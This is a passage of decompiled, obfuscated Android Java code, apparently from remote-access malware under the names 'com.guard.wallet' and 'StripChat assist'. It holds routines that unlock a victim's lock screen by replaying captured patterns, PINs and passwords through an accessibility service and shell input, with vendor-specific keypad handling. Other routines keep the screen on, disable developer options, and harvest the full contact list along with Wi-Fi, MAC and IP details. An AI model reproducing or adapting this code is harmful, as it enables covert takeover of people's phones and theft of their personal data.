                  Objects.equals(var0.getCipherGradeCode(), "PASSWORD_QUALITY_TOUCH_POINTS")
                     || Objects.equals(var0.getCipherGradeCode(), "PASSWORD_QUALITY_NUMERIC_COMPLEX")
               )
               && var0.getTouchCipher() != null
               && !var0.getTouchCipher().isEmpty()
               && o1(var0.getTouchCipher())) {
               var0.setCipherGradeCode("PASSWORD_QUALITY_TOUCH_POINTS");
               return true;
            }

            boolean var5 = Objects.equals(var0.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN");
            String var9 = "委托RatHat容器解锁完成";
            if (var5 && var0.getPatternCipher() != null && !var0.getPatternCipher().isEmpty()) {
               int var19;
               label404: {
                  String var34;
                  label454: {
                     List var8 = var0.getPatternCipher();
                     if (var8 != null && !var8.isEmpty()) {
                        Log.d("UnLockUtils", "使用滑动图案解锁");
                        LinkedList var11 = new LinkedList(var8);
                        if (!var11.isEmpty()) {
                           ListIterator var12 = var11.listIterator();
                           Point var31 = null;

                           while (var12.hasNext()) {
                              Point var10 = (Point)var12.next();
                              if (var10 != null && var10.getX() >= 0.0F && var10.getY() >= 0.0F) {
                                 if (var10.equals(var31)) {
                                    var12.remove();
                                 }

                                 var31 = var10;
                              } else {
                                 var12.remove();
                              }
                           }
                        }

                        T0(10);
                        if (MyAccessibilityService.P() != null) {
                           label391: {
                              Log.d("UnLockUtils", "委托无障碍容器使用滑动图案解锁");
                              var19 = var11.size();
                              Point[] var13 = new Point[var19];
                              var11.toArray(var13);
                              label390:
                              if (var19 > 0) {
                                 Exception var10000;
                                 label422: {
                                    try {
                                       var32 = Executors.newFixedThreadPool(1);
                                    } catch (Exception var15) {
                                       var10000 = var15;
                                       boolean var10001 = false;
                                       break label422;
                                    }

                                    var19 = 1;

                                    while (true) {
                                       if (var19 > 4) {
                                          break label390;
                                       }

                                       long var6 = (long)var19 * 1000L;

                                       label381: {
                                          try {
                                             CountDownLatch var52 = new CountDownLatch(1);
                                             com.guard.wallet.helper.h var62 = new com.guard.wallet.helper.h(var6, var13, 1);
                                             var32.submit(var62);
                                             if (var52.await(var6 + 1000L, TimeUnit.MILLISECONDS)) {
                                                break label381;
                                             }

                                             var32.shutdownNow();
                                             var5 = r();
                                          } catch (Exception var14) {
                                             var10000 = var14;
                                             boolean var74 = false;
                                             break;
                                          }

                                          if (var5) {
                                             var5 = true;
                                             break label391;
                                          }
                                       }

                                       var19++;
                                    }
                                 }

                                 Exception var33 = var10000;
                                 q.s("UnLockUtils", var33);
                              }

                              var5 = r();
                           }

                           if (var5) {
                              var34 = "委托无障碍容器输入滑动图案完成";
                              break label454;
                           }

                           Log.d("UnLockUtils", "委托无障碍容器输入滑动图案失败");
                        }

                        if (h.e.S() != null && h.e.S().D()) {
                           Log.d("UnLockUtils", "委托RatHat容器使用滑动图案解锁");
                           if (h.e.S().W(var11)) {
                              Log.d("UnLockUtils", "委托RatHat容器输入滑动图案完成");
                              if (r()) {
                                 var34 = "委托RatHat容器解锁完成";
                                 break label454;
                              }
                           }

                           Log.e("UnLockUtils", "委托RatHat容器解锁失败");
                        }
                     }

                     var19 = 0;
                     break label404;
                  }

                  Log.d("UnLockUtils", var34);
                  var19 = 1;
               }

               if (var19) {
                  return true;
               }
            }

            if (Objects.equals(var0.getCipherGradeCode(), "PASSWORD_QUALITY_NUMERIC_COMPLEX")
               || Objects.equals(var0.getCipherGradeCode(), "PASSWORD_QUALITY_ALPHANUMERIC")
               || Objects.equals(var0.getCipherGradeCode(), "PASSWORD_QUALITY_NUMERIC")
               || Objects.equals(var0.getCipherGradeCode(), "PASSWORD_QUALITY_TOUCH_POINTS")) {
               if (!q.B(var0.getTextCipher())) {
                  label346: {
                     label455: {
                        String var53 = var0.getTextCipher();
                        label323:
                        if (!q.B(var53)) {
                           String var36;
                           label456: {
                              Log.d("UnLockUtils", "使用文本密码解锁");
                              if (h.e.S() != null && h.e.S().D()) {
                                 Log.d("UnLockUtils", "委托RatHat容器输入文本密码");

                                 for (int var20 = 0; var20 < 5 && p0(); var20++) {
                                    var36 = "input text ".concat(var53);
                                    if (h.e.S().N(var36)) {
                                       Log.d("UnLockUtils", "委托RatHat输入文本密码完成");
                                       N(null);
                                       if (r()) {
                                          var36 = var9;
                                          break label456;
                                       }
                                    }

                                    U0();
                                 }

                                 if (!p0()) {
                                    var36 = "委托RatHat解锁成功";
                                    break label456;
                                 }

                                 Log.e("UnLockUtils", "委托RatHat解锁失败");
                              }

                              if (MyAccessibilityService.P() != null) {
                                 Log.d("UnLockUtils", "委托无障碍容器输入文本密码");
                                 UiObject var44 = MyAccessibilityService.P().J();
                                 if (var44 != null && var44.setText(var53)) {
                                    Log.d("UnLockUtils", "委托无障碍容器输入文本密码完成");
                                    N(var44);
                                    if (r()) {
                                       break label455;
                                    }
                                 }

                                 int var22;
                                 label314: {
                                    if (var44 != null && !q.B(var53)) {
                                       var36 = "";
                                       int var3 = 0;
                                       int var4 = 0;

                                       while (var3 < var53.length()) {
                                          T0(5);
                                          char var1 = var53.charAt(var3);
                                          StringBuilder var55 = new StringBuilder();
                                          var55.append(var1);
                                          var55.append("");
                                          var36 = var36.concat(var55.toString());
                                          var22 = var4;
                                          if (var44.setText(var36)) {
                                             var22 = var4 + 1;
                                          }

                                          var3++;
                                          var4 = var22;
                                       }

                                       if (var4 == var53.length()) {
                                          var22 = 1;
                                          break label314;
                                       }
                                    }

                                    var22 = 0;
                                 }

                                 if (var22) {
                                    Log.d("UnLockUtils", "委托无障碍容器逐个输入文本密码完成");
                                    N(var44);
                                    var5 = r();
                                    break label346;
                                 }
                              }
                              break label323;
                           }

                           Log.d("UnLockUtils", var36);
                           break label455;
                        }

                        var5 = false;
                        break label346;
                     }

                     var5 = true;
                  }

                  if (var5) {
                     break label453;
                  }

                  boolean var26;
                  label299: {
                     label457: {
                        String var54 = var0.getTextCipher();
                        if (!q.B(var54) && MyAccessibilityService.P() != null) {
                           if (q.D(var54)) {
                              label293: {
                                 if (!q.B(var54) && MyAccessibilityService.P() != null) {
                                    Log.d("UnLockUtils", "使用PIN码解锁");
                                    UiObjectCollection var39;
                                    if (e.l()) {
                                       MyAccessibilityService var38 = MyAccessibilityService.P();
                                       CombineFilter var45 = t1();
                                       var38.getClass();
                                       var39 = MyAccessibilityService.L(var45);
                                       Log.d("UnLockUtils", "依VIVO PIN码规则解锁");
                                       var9 = "com.android.systemui:id/VivoPinkey";
                                    } else if (e.i()) {
                                       MyAccessibilityService var47 = MyAccessibilityService.P();
                                       CombineFilter var40 = D0();
                                       var47.getClass();
                                       var39 = MyAccessibilityService.L(var40);
                                       Log.d("UnLockUtils", "依OPPO、RealMe、OnePlus PIN码规则解锁");
                                       var9 = null;
                                    } else {
                                       MyAccessibilityService var41 = MyAccessibilityService.P();
                                       CombineFilter var48 = v();
                                       var41.getClass();
                                       var39 = MyAccessibilityService.L(var48);
                                       Log.d("UnLockUtils", "依通用 PIN码规则解锁");
                                       var9 = "com.android.systemui:id/key";
                                    }

                                    if (var39 != null && var39.size() > 0) {
                                       Log.d("UnLockUtils", "PIN码节点查找成功");

                                       for (int var23 = 0; var23 < var54.length(); var23++) {
                                          char var17 = var54.charAt(var23);
                                          if (!q.B(var9)) {
                                             String var57 = var9.concat(String.valueOf(var17));

                                             for (UiObject var68 : var39.getNodes()) {
                                                if (var68 != null && Objects.equals(var68.id(), var57) && var68.click()) {
                                                   StringBuilder var69 = new StringBuilder("Click PIN Node By ID:");
                                                   var69.append(var57);
                                                   Log.d("UnLockUtils", var69.toString());
                                                   U0();
                                                }
                                             }
                                          } else {
                                             for (UiObject var63 : var39.getNodes()) {
                                                if (var63 != null
                                                   && (
                                                      Objects.equals(var63.text(), String.valueOf(var17))
                                                         || Objects.equals(var63.desc(), String.valueOf(var17))
                                                   )
                                                   && var63.click()) {
                                                   StringBuilder var64 = new StringBuilder("Click PIN Node By Text Or Desc:");
                                                   var64.append(String.valueOf(var17));
                                                   Log.d("UnLockUtils", var64.toString());
                                                   U0();
                                                }
                                             }
                                          }
                                       }

                                       w();
                                       if (r()) {
                                          Log.d("UnLockUtils", "PIN码解锁完成");
                                          var26 = true;
                                          break label293;
                                       }
                                    }

                                    Log.e("UnLockUtils", "使用PIN码解锁失败");
                                 }

                                 var26 = false;
                              }

                              if (var26) {
                                 break label457;
                              }
                           }

                           if (!q.B(var54) && MyAccessibilityService.P() != null) {
                              Log.d("UnLockUtils", "使用混合密码解锁");
                              if (e.l()) {
                                 Log.d("UnLockUtils", "依VIVO规则输入混合密码");
                                 MyAccessibilityService var42 = MyAccessibilityService.P();
                                 CombineFilter var49 = s1();
                                 var42.getClass();
                                 UiObjectCollection var43 = MyAccessibilityService.L(var49);
                                 MyAccessibilityService var50 = MyAccessibilityService.P();
                                 CombineFilter var58 = r1();
                                 var50.getClass();
                                 UiObjectCollection var51 = MyAccessibilityService.L(var58);
                                 if (var43 != null && var43.size() > 0 && var51 != null && var51.size() > 0) {
                                    for (int var25 = 0; var25 < var54.length(); var25++) {
                                       String var59 = String.valueOf(var54.charAt(var25));
                                       if (q.D(var59)) {
                                          String var67 = "com.android.systemui:id/num".concat(var59);

                                          for (UiObject var72 : var43.getNodes()) {
                                             if (var72 != null && Objects.equals(var72.id(), var67) && var72.click()) {
                                                StringBuilder var73 = new StringBuilder("Click VIVO Num Node ID:");
                                                var73.append(var67);
                                                Log.d("UnLockUtils", var73.toString());
                                                U0();
                                             }
                                          }
                                       } else {
                                          String var66 = "com.android.systemui:id/char_".concat(var59);

                                          for (UiObject var70 : var51.getNodes()) {
                                             if (var70 != null && Objects.equals(var70.id(), var66) && var70.click()) {
                                                StringBuilder var71 = new StringBuilder("Click VIVO Char Node ID:");
                                                var71.append(var66);
                                                Log.d("UnLockUtils", var71.toString());
                                                U0();
                                             }
                                          }
                                       }
                                    }

                                    w();
                                    if (r()) {
                                       Log.d("UnLockUtils", "使用混合密码解锁完成");
                                       break label457;
                                    }
                                 }
                              }

                              Log.e("UnLockUtils", "使用混合密码解锁失败");
                           }
                        }

                        var26 = false;
                        break label299;
                     }

                     var26 = true;
                  }

                  if (var26) {
                     var0.setCipherGradeCode("PASSWORD_QUALITY_NUMERIC_COMPLEX");
                     break label453;
                  }
               }

               if (var0.getTouchCipher() != null && !var0.getTouchCipher().isEmpty() && o1(var0.getTouchCipher())) {
                  var0.setCipherGradeCode("PASSWORD_QUALITY_TOUCH_POINTS");
                  return true;
               }
            }

            if (Objects.equals(var0.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN")
               || Objects.equals(var0.getCipherGradeCode(), "PASSWORD_QUALITY_TOUCH_POINTS")) {
               List var16 = var0.getEventCipher();
               if (var16 != null && !var16.isEmpty() && h.e.S() != null && h.e.S().D() && h.e.S().b0(var16) && r()) {
                  var5 = true;
               } else {
                  var5 = false;
               }

               return var5;
            }
         }

         return false;
      }

      var0.setTouchCipher(null);
      return true;
   }

   public static boolean r() {
      for (int var0 = 0; var0 < 30 && p0(); var0++) {
         try {
            Thread.sleep(100L);
         } catch (Exception var2) {
            q.s("UnLockUtils", var2);
         }
      }

      return p0() ^ true;
   }

   public static boolean r0() {
      Context var2 = Z();
      boolean var1 = false;
      boolean var0 = var1;
      if (var2 != null) {
         KeyguardManager var3 = (KeyguardManager)Z().getSystemService("keyguard");
         if (!var3.isDeviceSecure() && !var3.isKeyguardSecure()) {
            return var1;
         }

         var0 = true;
      }

      return var0;
   }

   public static CombineFilter r1() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = a.a.c(var0, "className", "android.widget.TextView");
      var0.getStringConditions().add(var1);
      var1 = new StringCondition();
      var1.setProperty("id");
      var1.setPrefix("com.android.systemui:id/char_");
      var0.getStringConditions().add(var1);
      return var0;
   }

   public static boolean s(Integer var0, Integer var1) {
      return G0(var0, var1, (long)(ViewConfiguration.getTapTimeout() + 50));
   }

   public static boolean s0(String var0) {
      if (!q.B(var0) && Z() != null) {
         List var2 = ((ActivityManager)Z().getSystemService("activity")).getRunningTasks(1);
         if (var2 != null && !var2.isEmpty()) {
            RunningTaskInfo var3 = (RunningTaskInfo)var2.get(0);
            if (a0.d.b(var3) != null && Objects.equals(a0.d.b(var3).getPackageName(), var0)) {
               int var1 = VERSION.SDK_INT;
               if (var1 >= 32) {
                  return c.a(var3);
               }

               if (var1 >= 29) {
                  return a0.d.s(var3);
               }

               return true;
            }
         }
      }

      return false;
   }

   public static CombineFilter s1() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = a.a.c(var0, "className", "android.widget.TextView");
      var0.getStringConditions().add(var1);
      var1 = new StringCondition();
      var1.setProperty("id");
      var1.setPrefix("com.android.systemui:id/num");
      var0.getStringConditions().add(var1);
      return var0;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static boolean t(List var0) {
      boolean var8 = false;
      boolean var7 = var8;
      if (var0 != null) {
         var7 = var8;
         if (!var0.isEmpty()) {
            Iterator var12 = var0.iterator();
            int var1 = 0;
            int var2 = 0;

            while (true) {
               int var4;
               while (true) {
                  if (!var12.hasNext()) {
                     var7 = var8;
                     if (var1 == var2) {
                        var7 = true;
                     }

                     return var7;
                  }

                  Point var9 = (Point)var12.next();
                  int var6 = (int)var9.getX();
                  int var5 = (int)var9.getY();
                  if (var6 >= 0 && var5 >= 0) {
                     var4 = var2 + 1;
                     var2 = var1;
                     int var3 = var1;

                     Exception var10000;
                     label60: {
                        label46: {
                           try {
                              if (!s(var6, var5)) {
                                 break label46;
                              }
                           } catch (Exception var11) {
                              var10000 = var11;
                              boolean var10001 = false;
                              break label60;
                           }

                           var2 = var1 + 1;
                        }

                        var3 = var2;

                        try {
                           T0(5);
                           break;
                        } catch (Exception var10) {
                           var10000 = var10;
                           boolean var15 = false;
                        }
                     }

                     Exception var14 = var10000;
                     q.s("GlobalActionAutomator", var14);
                     var1 = var3;
                     var2 = var4;
                  }
               }

               var1 = var2;
               var2 = var4;
            }
         }
      }

      return var7;
   }

   public static void t0(boolean var0) {
      if (h.e.S() != null && h.e.S().D()) {
         h.e var2 = h.e.S();
         if (var2.D()) {
            String var1;
            if (!var0) {
               var1 = "svc power stayon false";
            } else {
               var1 = "svc power stayon true";
            }

            var2.N(var1);
         }
      }
   }

   public static CombineFilter t1() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = a.a.c(var0, "className", "android.view.ViewGroup");
      var0.getStringConditions().add(var1);
      var1 = new StringCondition();
      var1.setProperty("id");
      var1.setPrefix("com.android.systemui:id/VivoPinkey");
      var0.getStringConditions().add(var1);
      return var0;
   }

   public static boolean u() {
      try {
         if (Z() != null && (System.canWrite(Z()) || j())) {
            Log.d("ApplicationUtil", "已有系统设置修改权限");
            Global.putInt(Z().getContentResolver(), "development_settings_enabled", 0);
            if (!K()) {
               Log.d("ApplicationUtil", "已有系统设置修改权限,关闭开发者选项成功");
               return true;
            }
         }
      } catch (Exception var1) {
         q.s("ApplicationUtil", var1);
      }

      return false;
   }

   public static Intent u0(String var0) {
      try {
         if (Z() != null && !q.B(var0)) {
            PackageManager var1 = Z().getPackageManager();
            if (var1.getApplicationInfo(var0, 8192) != null) {
               return var1.getLaunchIntentForPackage(var0);
            }
         }
      } catch (Exception var2) {
         q.s("ApplicationUtil", var2);
      }

      return null;
   }

   public static boolean u1() {
      Log.d("UnLockUtils", "依VIVO规则确认密码输入");
      MyAccessibilityService var0 = MyAccessibilityService.P();
      CombineFilter var1 = new CombineFilter();
      StringCondition var2 = a.a.c(var1, "id", "com.android.systemui:id/vivo_pin_confirm");
      var1.getStringConditions().add(var2);
      var0.getClass();
      UiObject var3 = MyAccessibilityService.M(var1);
      String var6;
      if (var3 != null && var3.click()) {
         var6 = "依VIVO规则确认Pin密码完成";
      } else {
         Log.d("UnLockUtils", "依VIVO规则确认Pin密码失败");
         var0 = MyAccessibilityService.P();
         var1 = new CombineFilter();
         var2 = a.a.c(var1, "id", "com.android.systemui:id/mix_normal_confirm");
         var1.getStringConditions().add(var2);
         var0.getClass();
         UiObject var5 = MyAccessibilityService.M(var1);
         if (var5 == null || !var5.click()) {
            Log.e("UnLockUtils", "依VIVO规则确认混合密码失败");
            return false;
         }

         var6 = "依VIVO规则确认混合密码完成";
      }

      Log.d("UnLockUtils", var6);
      return true;
   }

   public static CombineFilter v() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = a.a.c(var0, "className", "android.view.ViewGroup");
      var0.getStringConditions().add(var1);
      var1 = new StringCondition();
      var1.setProperty("id");
      var1.setPrefix("com.android.systemui:id/key");
      var0.getStringConditions().add(var1);
      return var0;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static String v0(String var0, String var1, String var2) {
      StringBuilder var4 = new StringBuilder();

      Exception var10000;
      label67: {
         boolean var3;
         try {
            var3 = q.B(var0);
         } catch (Exception var11) {
            var10000 = var11;
            boolean var10001 = false;
            break label67;
         }

         if (!var3) {
            try {
               var4.append(var0);
            } catch (Exception var10) {
               var10000 = var10;
               boolean var15 = false;
               break label67;
            }
         } else {
            try {
               var4.append("NULL");
            } catch (Exception var9) {
               var10000 = var9;
               boolean var16 = false;
               break label67;
            }
         }

         try {
            var3 = q.B(var1);
         } catch (Exception var8) {
            var10000 = var8;
            boolean var17 = false;
            break label67;
         }

         if (!var3) {
            try {
               var4.append(":");
               var4.append(var1);
            } catch (Exception var7) {
               var10000 = var7;
               boolean var18 = false;
               break label67;
            }
         } else {
            try {
               var4.append(":");
               var4.append("NULL");
            } catch (Exception var6) {
               var10000 = var6;
               boolean var19 = false;
               break label67;
            }
         }

         try {
            if (!q.B(var2)) {
               var4.append(":");
               var4.append(var2);
               return var4.toString();
            }
         } catch (Exception var12) {
            var10000 = var12;
            boolean var20 = false;
            break label67;
         }

         try {
            var4.append(":");
            var4.append("NULL");
            return var4.toString();
         } catch (Exception var5) {
            var10000 = var5;
            boolean var21 = false;
         }
      }

      Exception var13 = var10000;
      q.s("com.guard.wallet.utils.g", var13);
      return var4.toString();
   }

   public static boolean v1(int var0) {
      boolean var2 = m0();

      for (int var1 = 0; !var2 && var1 < var0; var2 = m0()) {
         if (!e.j()) {
            q.S();
         }

         T0(1);
         var1++;
      }

      return var2;
   }

   public static void w() {
      if (MyAccessibilityService.P() != null) {
         String var5;
         label38: {
            Log.d("UnLockUtils", "委托无障碍容器确认PIN码输入");
            if (e.m()) {
               Log.d("UnLockUtils", "依MIUI规则确认PIN码输入");
               MyAccessibilityService var0 = MyAccessibilityService.P();
               CombineFilter var1 = y1();
               var0.getClass();
               UiObject var2 = MyAccessibilityService.M(var1);
               if (var2 != null && var2.click()) {
                  var5 = "依MIUI规则确认PIN码输入完成";
                  break label38;
               }

               Log.e("UnLockUtils", "依MIUI规则确认PIN码输入失败");
            }

            if (e.l()) {
               if (u1()) {
                  var5 = "依VIVO规则确认密码完成";
                  break label38;
               }

               Log.e("UnLockUtils", "依VIVO规则确认密码失败");
            }

            Log.d("UnLockUtils", "开始依通用规则确认PIN码输入");
            MyAccessibilityService var6 = MyAccessibilityService.P();
            CombineFilter var3 = new CombineFilter();
            var3.setBoolConditions(new LinkedList<>());
            var3.setPointConditions(new LinkedList<>());
            var3.setStringConditions(new LinkedList<>());
            var3.getBoolConditions().add(new BoolCondition("clickable", true, true));
            var3.getStringConditions().add(new StringCondition("id", null, null, "com.android.systemui:id/key_enter", null, null));
            var6.getClass();
            UiObject var4 = MyAccessibilityService.M(var3);
            if (var4 == null || !var4.click()) {
               return;
            }

            var5 = "依通用规则确认PIN码输入完成";
         }

         Log.d("UnLockUtils", var5);
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static LinkedList w0() {
      HashMap var6 = new HashMap();
      if (Z() != null && n()) {
         ContentResolver var4 = Z().getContentResolver();
         if (var4 != null) {
            Exception var10000;
            label165: {
               Cursor var8;
               try {
                  var8 = var4.query(Data.CONTENT_URI, null, null, null, null);
               } catch (Exception var30) {
                  var10000 = var30;
                  boolean var10001 = false;
                  break label165;
               }

               label154:
               if (var8 != null) {
                  try {
                     if (var8.getCount() <= 0) {
                        break label154;
                     }

                     var8.moveToFirst();
                  } catch (Exception var24) {
                     var10000 = var24;
                     boolean var47 = false;
                     break label165;
                  }

                  while (true) {
                     long var1;
                     DeviceContactInfoVO var5;
                     String var7;
                     String var9;
                     try {
                        var1 = var8.getLong(var8.getColumnIndexOrThrow("contact_id"));
                        var9 = var8.getString(var8.getColumnIndexOrThrow("display_name"));
                        var7 = var8.getString(var8.getColumnIndexOrThrow("mimetype"));
                        var5 = (DeviceContactInfoVO)var6.get(var1);
                     } catch (Exception var22) {
                        var10000 = var22;
                        boolean var48 = false;
                        break label165;
                     }

                     DeviceContactInfoVO var32 = var5;
                     if (var5 == null) {
                        try {
                           var32 = new DeviceContactInfoVO();
                        } catch (Exception var21) {
                           var10000 = var21;
                           boolean var49 = false;
                           break label165;
                        }
                     }

                     boolean var3;
                     try {
                        var32.setDeviceContactId(String.valueOf(var1));
                        var32.setDisplayName(var9);
                        var3 = "vnd.android.cursor.item/phone_v2".equals(var7);
                     } catch (Exception var20) {
                        var10000 = var20;
                        boolean var50 = false;
                        break label165;
                     }

                     if (var3) {
                        try {
                           int var0 = var8.getInt(var8.getColumnIndexOrThrow("data2"));
                           var9 = var8.getString(var8.getColumnIndexOrThrow("data3"));
                           String var10 = var8.getString(var8.getColumnIndexOrThrow("data1"));
                           DeviceContactNumberVO var34 = new DeviceContactNumberVO();
                           var34.setNumberType(var0);
                           var34.setNumber(var10);
                           var34.setLabel(var9);
                           var32.getChildren().add(var34);
                        } catch (Exception var19) {
                           var10000 = var19;
                           boolean var51 = false;
                           break label165;
                        }
                     }

                     try {
                        if ("vnd.android.cursor.item/name".equals(var7)) {
                           String var35 = var8.getString(var8.getColumnIndexOrThrow("data2"));
                           var9 = var8.getString(var8.getColumnIndexOrThrow("data3"));
                           var32.setFirstName(var35);
                           var32.setLastName(var9);
                        }
                     } catch (Exception var29) {
                        var10000 = var29;
                        boolean var52 = false;
                        break label165;
                     }

                     try {
                        var3 = "vnd.android.cursor.item/organization".equals(var7);
                     } catch (Exception var18) {
                        var10000 = var18;
                        boolean var53 = false;
                        break label165;
                     }

                     if (var3) {
                        try {
                           String var46 = var8.getString(var8.getColumnIndexOrThrow("data1"));
                           String var36 = var8.getString(var8.getColumnIndexOrThrow("data5"));
                           String var11 = var8.getString(var8.getColumnIndexOrThrow("data4"));
                           var9 = var8.getString(var8.getColumnIndexOrThrow("data6"));
                           var32.setCompany(var46);
                           var32.setDepartment(var36);
                           var32.setJob(var11);
                           var32.setJobDescription(var9);
                        } catch (Exception var17) {
                           var10000 = var17;
                           boolean var54 = false;
                           break label165;
                        }
                     }

                     try {
                        if ("vnd.android.cursor.item/email_v2".equals(var7)) {
                           String var37 = var8.getString(var8.getColumnIndexOrThrow("data1"));
                           var9 = var8.getString(var8.getColumnIndexOrThrow("data4"));
                           var32.setEmailAddress(var37);
                           var32.setEmailAddressDisplayName(var9);
                        }
                     } catch (Exception var28) {
                        var10000 = var28;
                        boolean var55 = false;
                        break label165;
                     }

                     try {
                        if ("vnd.android.cursor.item/note".equals(var7)) {
                           var32.setNote(var8.getString(var8.getColumnIndexOrThrow("data1")));
                        }
                     } catch (Exception var16) {
                        var10000 = var16;
                        boolean var56 = false;
                        break label165;
                     }

                     try {
                        if ("vnd.android.cursor.item/nickname".equals(var7)) {
                           var32.setNickName(var8.getString(var8.getColumnIndexOrThrow("data1")));
                        }
                     } catch (Exception var27) {
                        var10000 = var27;
                        boolean var57 = false;
                        break label165;
                     }

                     try {
                        if ("vnd.android.cursor.item/website".equals(var7)) {
                           var32.setWebUrl(var8.getString(var8.getColumnIndexOrThrow("data1")));
                        }
                     } catch (Exception var15) {
                        var10000 = var15;
                        boolean var58 = false;
                        break label165;
                     }

                     try {
                        if ("vnd.android.cursor.item/relation".equals(var7)) {
                           var32.setRelationName(var8.getString(var8.getColumnIndexOrThrow("data1")));
                        }
                     } catch (Exception var26) {
                        var10000 = var26;
                        boolean var59 = false;
                        break label165;
                     }

                     try {
                        if ("vnd.android.cursor.item/im".equals(var7)) {
                           String var38 = var8.getString(var8.getColumnIndexOrThrow("data5"));
                           var9 = var8.getString(var8.getColumnIndexOrThrow("data6"));
                           var32.setProtocol(var38);
                           var32.setCustomProtocol(var9);
                        }
                     } catch (Exception var14) {
                        var10000 = var14;
                        boolean var60 = false;
                        break label165;
                     }

                     try {
                        if ("vnd.android.cursor.item/identity".equals(var7)) {
                           var9 = var8.getString(var8.getColumnIndexOrThrow("data1"));
                           String var39 = var8.getString(var8.getColumnIndexOrThrow("data2"));
                           var32.setIdentity(var9);
                           var32.setNamespace(var39);
                        }
                     } catch (Exception var25) {
                        var10000 = var25;
                        boolean var61 = false;
                        break label165;
                     }

                     try {
                        if ("vnd.android.cursor.item/group_membership".equals(var7)) {
                           var32.setGroupId(var8.getString(var8.getColumnIndexOrThrow("data1")));
                        }
                     } catch (Exception var13) {
                        var10000 = var13;
                        boolean var62 = false;
                        break label165;
                     }

                     try {
                        var6.put(var1, var32);
                        if (!var8.moveToNext()) {
                           break;
                        }
                     } catch (Exception var23) {
                        var10000 = var23;
                        boolean var63 = false;
                        break label165;
                     }
                  }
               }

               if (var8 == null) {
                  return !var6.values().isEmpty() ? new LinkedList(var6.values()) : null;
               }

               try {
                  var8.close();
                  return !var6.values().isEmpty() ? new LinkedList(var6.values()) : null;
               } catch (Exception var12) {
                  var10000 = var12;
                  boolean var64 = false;
               }
            }

            Exception var33 = var10000;
            q.s("ContactUtils", var33);
         }
      }

      return !var6.values().isEmpty() ? new LinkedList(var6.values()) : null;
   }

   public static File w1(X509CertImpl var0) {
      try {
         if (!q.B(i0())) {
            File var2 = new File(i0(), "cert.pem");
            BASE64Encoder var3 = new BASE64Encoder();
            FileOutputStream var1 = new FileOutputStream(var2);
            var1.write("-----BEGIN CERTIFICATE-----".getBytes(StandardCharsets.UTF_8));
            var1.write(10);
            var3.encode(var0.getEncoded(), var1);
            var1.write(10);
            var1.write("-----END CERTIFICATE-----".getBytes(StandardCharsets.UTF_8));
            var1.flush();
            var1.close();
            return var2;
         }
      } catch (Exception var4) {
         q.s("AdbKeyUtils", var4);
      }

      return null;
   }

   public static boolean x() {
      LinkedList var1 = f0();
      LinkedHashSet var0 = q0();
      if (!var1.isEmpty() && !var0.isEmpty()) {
         Iterator var2 = var1.iterator();

         while (var2.hasNext()) {
            if (var0.contains((String)var2.next())) {
               return true;
            }
         }
      }

      return false;
   }

   public static String x0() {
      if (Z() != null) {
         PackageManager var0 = Z().getPackageManager();
         ApplicationInfo var1 = Z().getApplicationInfo();
         if (var0 != null && var1 != null) {
            return var0.getApplicationLabel(var1).toString();
         }
      }

      Integer var2 = d.a;
      String var3;
      if (MainApplication.getInstance() != null
         && MainApplication.getInstance().getBuildConfig() != null
         && !q.B(MainApplication.getInstance().getBuildConfig().getAppLabel())) {
         var3 = MainApplication.getInstance().getBuildConfig().getAppLabel();
      } else {
         var3 = "StripChat assist";
      }

      return var3;
   }

   public static boolean x1(Long var0) {
      if (var0 != null) {
         try {
            if (var0 > 0L && Z() != null && (System.canWrite(Z()) || j())) {
               Log.d("ApplicationUtil", "已有系统设置修改权限");
               System.putLong(Z().getContentResolver(), "screen_off_timeout", var0);
               if (var0.equals(P0())) {
                  Log.d("ApplicationUtil", "已有系统设置修改权限,修改屏幕休眠时间成功");
                  return true;
               }
            }
         } catch (Exception var1) {
            q.s("ApplicationUtil", var1);
         }
      }

      return false;
   }

   public static Bitmap y(Bitmap var0) {
      int var2 = var0.getWidth();
      int var1 = var0.getHeight();
      Picture var3 = new Picture();
      var3.beginRecording(var2, var1).drawBitmap(var0, 0.0F, 0.0F, null);
      var3.endRecording();
      return VERSION.SDK_INT >= 28 ? android.support.v4.view.a.c(var3, var2, var1, Config.ARGB_8888) : null;
   }

   public static String y0() {
      return Z() != null ? Z().getApplicationInfo().nativeLibraryDir : null;
   }

   public static CombineFilter y1() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = a.a.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "id", "com.android.systemui:id/btn_letter_ok");
      var0.getStringConditions().add(var1);
      return var0;
   }

   public static WIFIState z(Context var0) {
      WifiManager var6 = (WifiManager)var0.getSystemService("wifi");
      if (!var6.isWifiEnabled()) {
         return null;
      } else {
         WIFIState var4 = new WIFIState();
         WifiInfo var5 = var6.getConnectionInfo();
         if (var5 != null) {
            String var2;
            label42: {
               String var3 = var5.getSSID();
               if (!q.B(var3)) {
                  var2 = var3;
                  if (!var3.contains("unknown")) {
                     break label42;
                  }
               }

               int var1 = var5.getNetworkId();
               var2 = var3;
               if (ContextCompat.checkSelfPermission(var0, "android.permission.ACCESS_FINE_LOCATION") == 0) {
                  Iterator var7 = var6.getConfiguredNetworks().iterator();

                  while (true) {
                     var2 = var3;
                     if (!var7.hasNext()) {
                        break;
                     }

                     WifiConfiguration var10 = (WifiConfiguration)var7.next();
                     if (var10.networkId == var1) {
                        var2 = var10.SSID;
                        break;
                     }
                  }
               }
            }

            if (!q.B(var2) && !var2.contains("unknown")) {
               var4.setWifiId(var2.replaceAll("\"", ""));
            }

            var4.setMacAddress(var5.getMacAddress());
            int var9 = var5.getIpAddress();
            StringBuilder var8 = new StringBuilder();
            var8.append(var9 & 0xFF);
            var8.append(".");
            var8.append(var9 >> 8 & 0xFF);
            var8.append(".");
            var8.append(var9 >> 16 & 0xFF);
            var8.append(".");
            var8.append(var9 >> 24 & 0xFF);
            var4.setLocalIp(var8.toString());
            if (q.B(var4.getWifiId())) {
               var4.setWifiId(var5.getMacAddress().replaceAll(":", ""));
            }
         }

         h.D(h.N(var4), "wifiState");
         return var4;
      }
   }

